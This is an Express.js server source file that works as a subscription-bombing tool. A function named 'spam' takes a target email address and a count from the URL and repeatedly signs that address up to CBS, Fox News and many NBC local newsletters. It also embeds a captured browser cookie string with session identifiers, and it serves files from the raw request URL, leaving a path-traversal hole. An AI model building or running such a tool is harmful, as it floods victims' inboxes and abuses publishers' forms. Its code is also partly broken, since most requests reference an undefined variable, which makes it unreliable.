import express from 'express';
import fs from 'fs';
import fetch from "node-fetch";
import { dirname } from 'splendid-ui/node'
const __dirname = dirname(import.meta.url);
const app = express();
var num = 0;
var errs = 0;
function createDirectory(directoryPath) {
    if (!fs.existsSync(directoryPath)){
        fs.mkdirSync(directoryPath);
    }
}
function spam(theemail, encodedEmail, path){
fetch('https://www.cbsnews.com/newsletters/xhr/signup', {
  method: 'POST',
  headers: {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'text/plain',
    'cookie': 'OTGPPConsent=DBABLA~BVQqAAAAAgA.QA; fly_vid=40d43529-820f-43b2-87e1-b0df430580f2; usprivacy=1YNN; optimizelyEndUserId=oeu1717445080655r0.7905935851424593; _cb=B9-8OXCM-4FBCOjQ7L; s_ecid=MCMID%7C51926034555642537863534432191948189861; _pubcid=8080a9ee-afc5-4df8-bca4-89735e3392cc; trc_cookie_storage=taboola%2520global%253Auser-id%3D4a041288-8518-4bff-839e-d593b13a869f-tuctd4804f5; AAMC_cbsi_0=REGION%7C7; _chartbeat2=.1717445080778.1717449978461.1.BOzulcDy8_fvDqwnqcDE3TM4BN5xX7.1; cto_bundle=LToL6V83SHRwOXVjS24xOWEzQjNIWmpzOWxlREhKOFhRRjRlUzVyb0VxUk5TQUg1WDczd3MyTHdmVFNSYTBuVEZIJTJCNVhCRlRPZE0xd2ZGdkF3eXklMkJCc2VnazVycGR6VkVscGEwNXBRazg5QXViZkNlb2VYaFRwRDZJSW9iZHR0WDZPNnhYWWJrZ2Y1Y012T3l2b1l3NEdwamR3JTNEJTNE; cto_bidid=ppZctl9NUjBKNUtnT20wMGRNa2w5YnlRSmdia0VLZkY0MDVrUEVwalhjYmZhQ2U0OHFHVSUyQjJTMTRyc3QxMzY4UHI2M0ElMkZYQkVIOHNoQnRVU3dUem5lS1E0cEhTdSUyQnBSTlZqT0VHaDBzZmhORWppdyUzRA; muxData=mux_viewer_id=e4da8dec-f3e9-43b2-ab32-fe11b729e3f5&msn=0.67552805435716&sid=85cce011-5f16-4513-bbd1-032ef2b62467&sst=1717709518003&sex=1717711019764; fly_device=desktop; fly_geo={"countryCode": "IN", "region": "MH", "dma": "356002", "connection": { "type": "broadband"}}; CBS_INTERNAL=0; fly_js_debug=[]; first_page_today=false; s_vnum=1723215375141%26vn%3D1; s_invisit=true; s_lv_cbsnews_s=More%20than%2030%20days; AMCVS_10D31225525FF5790A490D4D%40AdobeOrg=1; s_cc=true; _BB.bs=b|3; _BB.d=1|||1; _pubcid_cst=zix7LPQsHA%3D%3D; _lr_retry_request=true; _lr_env_src_ats=false; PHPSESSID=ho0u7feopjj1htn5gch31npure; prevPageType=user_nl_subscription; prevPageName=cbsnews:/newsletters/; QSI_HistorySession=https%3A%2F%2Fwww.cbsnews.com%2Fnewsletters%2F~1720623397016; CBSNEWS.features.smart-banner-SB_breaking-news=%7B%22type%22%3A%22permanent%22%2C%22value%22%3A%22visible%22%7D; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Jul+10+2024+20%3A27%3A05+GMT%2B0530+(India+Standard+Time)&version=202401.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4cbd3e9e-d07a-43b6-a9e4-2c9025000c72&interactionCount=1&landingPath=NotLandingPage&GPPCookiesCount=1&groups=1%3A1%2C5%3A1%2C4%3A1%2C2%3A1%2C3%3A1&AwaitingReconsent=false&genVendors=V16%3A0%2CV10%3A0%2CV12%3A0%2CV9%3A0%2CV15%3A0%2CV6%3A0%2CV8%3A0%2CV5%3A0%2CV7%3A0%2CV11%3A0%2C&geolocation=IN%3BMH; OptanonAlertBoxClosed=2024-07-10T14:57:05.485Z; _awl=2.1720623429.5-bc04ea96466a615fdd2507b2ffffaa29-6763652d75732d6561737431-3; utag_main=v_id:018fdfb43607001516817e7745100506f001806700bd0$_sn:3$_se:6$_ss:0$_st:1720625234862$vapi_domain:cbsnews.com$ses_id:1720623375104%3Bexp-session$_pn:5%3Bexp-session; s_getNewRepeat=1720623434867-New; s_lv_cbsnews=1720623434867; s_sq=%5B%5BB%5D%5D; AMCV_10D31225525FF5790A490D4D%40AdobeOrg=1075005958%7CMCIDTS%7C19915%7CMCMID%7C51926034555642537863534432191948189861%7CMCAAMLH-1718053855%7C7%7CMCAAMB-1720623374%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1720630634s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.4.1',
    'dnt': '1',
    'origin': 'https://www.cbsnews.com',
    'priority': 'u=1, i',
    'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
  },
  body: '{"email":"' + theemail + '","sub":"m40186,m40183","token":"vDZ3zu26GBfyrHadfFbi0Zvnhfsa_jsBAyPrIbgcy3I","mCodeOptin":"m40183"}'
}).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/pick-six/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23664&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/fantasy-football-today/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23662&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/fantasy-baseball-today/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23663&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/the-first-cut/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23584&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbsnews.com/newsletters/xhr/signup", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "text/plain",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.cbsnews.com/newsletters/widget?v=4303070594ae09e4278f40f24f771b58&subs=e889%2Ce881%2Ce882%2Ce879%2Ce883%2Ce884%2Ce241",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + theemail + "\",\"sub\":\"e889,e881,e882,e879,e883,e884,e241\"}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.foxnews.com/portal/newsalertsubscribe?type=foxnation", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "x-requested-with": "XMLHttpRequest",
                },
                "referrer": "https://www.foxnews.com/newsletters",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": "{\"email\":\"" + email + "\",\"campaign\":\"fox-nation\",\"url\":\"https://www.foxnews.com/newsletters\"}",
                "method": "POST",
                "mode": "cors"
            });
    }).then(function(response){
        return fetch("https://www.nbcbayarea.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcbayarea.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"kntv_coronavirus\":1,\"KNBC_News7am\":1,\"KNBC_NewsNoon\":1,\"KNBC_News5pm\":1,\"KNBC_BreakingNews\":1,\"KNBC_Weather\":1,\"KNBC_Sports\":1,\"KNBC_Entertainment\":1,\"KNBC_Contests\":1,\"KNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcboston.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcboston.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WBTS_coronavirus\":1,\"WBTS_BreakingNews\":1,\"WBTS_News7am\":1,\"WBTS_NewsNoon\":1,\"WBTS_News5pm\":1,\"WBTS_News11pm\":1,\"WBTS_Weather\":1,\"WBTS_Entertainment\":1,\"WBTS_Investigations\":1,\"WBTS_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcchicago.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcchicago.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WMAQ_coronavirus\":1,\"WMAQ_News7am\":1,\"WMAQ_Noon\":1,\"WMAQ_News8pm\":1,\"WMAQ_BreakingNews\":1,\"WMAQ_Weather\":1,\"WMAQ_Sports\":1,\"WMAQ_Entertainment\":1,\"WMAQ_Contests\":1,\"WMAQ_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcconnecticut.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcconnecticut.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WVIT_coronavirus\":1,\"WVIT_News7am\":1,\"WVIT_NewsNoon\":1,\"WVIT_News8p\":1,\"WVIT_BreakingNews\":1,\"WVIT_Weather\":1,\"WVIT_Contest\":1,\"WVIT_Entertainment\":1,\"WVIT_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcdfw.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcdfw.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KXAS_coronavirus\":1,\"KXAS_News7am\":1,\"KXAS_NewsNoon\":1,\"KXAS_News8pm\":1,\"KXAS_BreakingNews\":1,\"KXAS_Weather\":1,\"KXAS_Entertainment\":1,\"KXAS_Announcements\":1,\"KXAS_Investigations\":1,\"KXAS_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbclosangeles.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcconnecticut.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WVIT_coronavirus\":1,\"WVIT_News7am\":1,\"WVIT_NewsNoon\":1,\"WVIT_News8p\":1,\"WVIT_BreakingNews\":1,\"WVIT_Weather\":1,\"WVIT_Contest\":1,\"WVIT_Entertainment\":1,\"WVIT_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcmiami.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcmiami.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WTVJ_coronavirus\":1,\"WTVJ_BreakingNews\":1,\"WTVJ_News7am\":1,\"WTVJ_NewsNoon\":1,\"WTVJ_News8pm\":1,\"WTVJ_Weather\":1,\"WTVJ_Sports\":1,\"WTVJ_Entertainment\":1,\"WTVJ_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcnewyork.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcnewyork.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WNBC_News7am\":1,\"WNBC_News11pm\":1,\"WNBC_Contests\":1,\"WNBC_BreakingNews\":1,\"WNBC_Weather\":1,\"WNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcphiladelphia.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcphiladelphia.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WCAU_wawa\":1,\"WCAU_News7am\":1,\"WCAU_NewsNoon\":1,\"WCAU_News8pm\":1,\"WCAU_BreakingNews\":1,\"WCAU_Weather\":1,\"WCAU_Sports\":1,\"WCAU_Entertainment\":1,\"WCAU_Olympics\":1,\"WCAU_Contests\":1,\"WCAU_Announcements\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcsandiego.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcsandiego.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KNSD_coronavirus\":1,\"KNSD_News7am\":1,\"KNSD_NewsNoon\":1,\"KNSD_News6pm\":1,\"KNSD_BreakingNews\":1,\"KNSD_Weather\":1,\"KNSD_Sports\":1,\"KNSD_TheScene\":1,\"KNSD_Contests\":1,\"KNSD_SoundDiego\":1,\"KNSD_SoundDiegoPlatinum\":1,\"KNSD_WorthTheTrip\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response){
        return fetch("https://www.nbcwashington.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.nbcwashington.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WRC_coronavirus\":1,\"WRC_News7am\":1,\"WRC_NewsNoon\":1,\"WRC_News8pm\":1,\"WRC_Olympics\":1,\"WRC_BreakingNews\":1,\"WRC_Contests\":1,\"WRC_Sports\":1,\"WRC_Entertainment\":1,\"WRC_Weather\":1}}",
            "method": "POST",
            "mode": "cors"
        });
    }).catch(function(e) {
        errs++;
        fs.appendFile(path + '/errmessages.txt', "\n", (err) => {
  if (err) {
    console.error('Error appending data:', err);
  } else {
    
  }
});
    }).then(function(response){
        num++;
        fs.writeFileSync(path + '/num.txt', num.toString());
        fs.writeFileSync(path + '/errs.txt', errs.toString());
    });      
}
app.use(express.static("static"));
app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
    try{
    errs = 0;
    num = 0;
    const id1 = atob(req.params.id1);
    const id2 = atob(req.params.id2);
    const theemail = id1;
    const times = Number(id2);
    const encodedEmail = theemail.replace('@', '%40');
    createDirectory(__dirname + "/sendMail");
    createDirectory(__dirname + "/sendMail/" + req.params.id1);
    createDirectory(__dirname + "/sendMail/" + req.params.id1 + "/" + req.params.id2);
    fs.writeFileSync(__dirname + req.url.slice(0, req.url.length - 11) + '/num.txt', "Loading...");
    fs.writeFileSync(__dirname + req.url.slice(0, req.url.length - 11) + '/errmessages.txt', "");
    for(var i = 0; i < times; i++){
    spam(theemail, encodedEmail, __dirname + req.url.slice(0, req.url.length - 11));
    }
    res.sendFile(__dirname + '/spamPages/spam.html');
} catch(e){
    res.status(500).send("Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" + e);
}
});
app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
    res.sendFile(__dirname + req.url);
});
app.listen(8080, () => {
    console.log('Server is running on port 8080');
});
